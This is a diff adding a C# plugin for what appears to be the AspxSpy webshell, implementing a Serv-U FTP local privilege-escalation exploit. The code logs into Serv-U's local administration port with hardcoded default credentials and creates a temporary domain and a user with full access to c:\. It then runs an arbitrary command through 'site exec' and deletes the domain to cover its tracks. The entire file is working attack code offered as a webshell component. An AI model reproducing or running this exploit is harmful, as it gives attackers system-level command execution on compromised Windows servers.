@@ -1,0 +1,103 @@
+using System;
+using System.Threading;
+using System.Net;
+using System.Net.Sockets;
+using System.Collections;
+using System.Collections.Specialized;
+using System.Collections.Generic;
+using System.Security;
+using System.Security.Cryptography;
+using System.Security.Permissions;
+using System.Text;
+using System.IO;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Text.RegularExpressions;
+namespace Zcg.Test.AspxSpyPlugins{
+public class SUEXPPlugin{
+static StringBuilder sb=new StringBuilder();
+public static string Run(string[] str){
+string user="localadministrator";
+string pass="#l@$ak#.lk;0@P";
+string cmd="cmd /c whoami /all";
+int port=43958;
+try
+{
+cmd=str[0];
+user=str[1];
+pass=str[2];
+port=Int32.Parse(str[3]);
+}catch{}
+TcpClient tcp=new TcpClient();
+TcpClient tcp1=new TcpClient();
+try
+{
+NetworkStream NS=null;
+NetworkStream NS1=null;
+string loginuser="user "+user+"\r\n";
+string loginpass="pass "+pass+"\r\n";
+string site="SITE MAINTENANCE\r\n";
+string deldomain="-DELETEDOMAIN\r\n-IP=0.0.0.0\r\n PortNo=52521\r\n";
+string setdomain="-SETDOMAIN\r\n-Domain=BIN|0.0.0.0|52521|-1|1|0\r\n-TZOEnable=0\r\n TZOKey=\r\n";
+string newdomain="-SETUSERSETUP\r\n-IP=0.0.0.0\r\n-PortNo=52521\r\n-User=bin\r\n-Password=binftp\r\n-HomeDir=c:\\\r\n-LoginMesFile=\r\n-Disable=0\r\n-RelPaths=1\r\n-NeedSecure=0\r\n-HideHidden=0\r\n-AlwaysAllowLogin=0\r\n-ChangePassword=0\r\n-QuotaEnable=0\r\n-MaxUsersLoginPerIP=-1\r\n-SpeedLimitUp=0\r\n-SpeedLimitDown=0\r\n-MaxNrUsers=-1\r\n-IdleTimeOut=600\r\n-SessionTimeOut=-1\r\n-Expire=0\r\n-RatioDown=1\r\n-RatiosCredit=0\r\n-QuotaCurrent=0\r\n-QuotaMaximum=0\r\n-Maintenance=System\r\n-PasswordType=Regular\r\n-Ratios=NoneRN\r\n Access=c:\\|RWAMELCDP\r\n";
+tcp.Connect("127.0.0.1",port);
+tcp.ReceiveBufferSize=1024;
+NS=tcp.GetStream();
+Rev(NS);
+Send(NS,loginuser);
+Rev(NS);
+Send(NS,loginpass);
+Rev(NS);
+Send(NS,site);
+Rev(NS);
+Send(NS,deldomain);
+Rev(NS);
+Send(NS,setdomain);
+Rev(NS);
+Send(NS,newdomain);
+Rev(NS);
+sb.Append("<font color=\"green\"><b>Exec Cmd.................<br></b></font>");
+tcp1.Connect(System.Web.HttpContext.Current.Request.ServerVariables["LOCAL_ADDR"],52521);
+NS1=tcp1.GetStream();
+Rev(NS1);
+Send(NS1,"user bin\r\n");
+Rev(NS1);
+Send(NS1,"pass binftp\r\n");
+Rev(NS1);
+Send(NS1,"site exec "+cmd+"\r\n");
+Rev(NS1);
+Send(NS1,"quit\r\n");
+Rev(NS1);
+Send(NS,deldomain);
+Rev(NS);
+}
+catch(Exception error){return error.ToString();}
+finally{tcp1.Close();tcp.Close();}
+return sb.ToString();
+}
+static void Rev(NetworkStream instream)
+{
+	string Restr="";
+	if(instream.CanRead)
+	{
+		byte[] buffer=new byte[1024];
+		do
+		{
+			System.Threading.Thread.Sleep(50);
+			int len=instream.Read(buffer,0,buffer.Length);
+			Restr+=Encoding.Default.GetString(buffer,0,len);
+		}
+		while(instream.DataAvailable);
+	}
+	sb.Append("<font color=red>"+Restr.Replace("\0","").Replace("\r\n","<br>")+"</font><br>");
+}
+static void Send(NetworkStream instream,string Sendstr)
+{
+	if(instream.CanWrite)
+	{
+		byte[] buffer=Encoding.Default.GetBytes(Sendstr);
+		instream.Write(buffer,0,buffer.Length);
+	}
+	sb.Append("<font color=blue>"+Sendstr.Replace("\r\n","<br>")+"</font><br>");
+}
+}}
